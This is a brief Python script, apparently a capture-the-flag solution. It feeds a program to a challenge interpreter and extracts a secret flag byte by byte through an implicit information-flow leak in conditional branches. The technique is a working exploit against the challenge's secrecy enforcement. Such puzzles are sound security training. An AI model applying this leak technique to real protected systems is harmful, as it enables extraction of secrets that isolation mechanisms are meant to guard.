#!/usr/bin/env python3
import os, re, subprocess, sys

def get_byte(cmd, k):
    expr = '''
    let secret = ref (flag / {} % 256) in
    let leaked = ref 0 in
    let test = fn (bit : int) => (
        if !secret < bit
        then ()
        else (secret := !secret - bit; leaked := !leaked + bit)
    ) in
    test 128; test 64; test 32; test 16; test 8; test 4; test 2; test 1;
    !leaked'''.format(1 << (k * 8))
    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    output = p.communicate(input=expr.encode('ascii'))[0].decode('ascii')
    return(int(output.split()[0]))

def get_flag(cmd):
    values = [get_byte(sys.argv[1:], k) for k in range(36)]
    return bytes(reversed(values)).decode('ascii')

if __name__ == '__main__':
    print(get_flag(sys.argv[1:]))
